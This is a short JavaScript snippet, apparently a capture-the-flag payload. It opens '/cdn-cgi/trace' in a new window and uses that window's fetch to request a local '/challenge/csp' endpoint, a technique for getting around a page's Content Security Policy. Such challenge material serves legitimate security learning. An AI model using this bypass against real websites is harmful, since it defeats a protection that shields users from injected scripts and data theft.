const w = window.open('/cdn-cgi/trace');
setTimeout(() => {
    w.fetch("http://localhost:3000/challenge/csp", {mode: "no-cors"});
}, 950);